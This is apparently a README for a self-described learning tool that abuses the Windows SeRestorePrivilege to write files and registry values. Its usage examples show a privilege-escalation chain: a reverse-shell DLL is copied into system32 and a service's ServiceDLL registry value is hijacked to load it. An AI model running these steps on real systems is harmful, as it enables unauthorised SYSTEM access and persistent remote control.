## What is this tool

This tool is intended to abuse SeRestorePrivilege. It basically allows you to write files and registry values. It's far from a "complete" tool. It was developed to help me to understand better the concept of this privilege abuse.

Several pieces of code were copied from the presentation `[show me your privileges and I will lead you to SYSTEM]`.

## Usage

```
Usage:
        .\seprivilege-xpltr.exe filewrite <src-path> <dst-path>
        .\seprivilege-xpltr.exe regwrite <hkey> <subkey> <value-name> <data>

Examples:
        .\seprivilege-xpltr.exe filewrite "C:\Temp\reverse-shell.dll" "C:\Windows\system32\reverse-shell.dll"
        .\seprivilege-xpltr.exe regwrite hklm "SYSTEM\CurrentControlSet\Services\dmwappushservice\Parameters" ServiceDLL  "C:\Windows\system32\reverse-shell.dll"
```
